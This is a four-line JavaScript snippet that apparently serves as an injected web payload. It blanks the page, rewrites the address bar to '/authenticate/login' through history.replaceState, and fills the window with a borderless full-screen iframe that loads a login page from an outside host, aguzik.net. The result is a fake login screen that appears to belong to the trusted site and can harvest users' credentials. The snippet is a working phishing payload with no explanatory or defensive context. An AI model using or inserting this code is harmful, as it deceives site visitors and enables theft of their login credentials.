document.body.style='color: white';
document.body.innerHTML = '<div></div>';
history.replaceState(history.state, '', '/authenticate/login');
document.body.innerHTML='<iframe frameBorder=0 style="position: absolute; top: 50; left: 0; width: 100vw; height: 100vh;" src="https://aguzik.net/ar-login.html"/>'
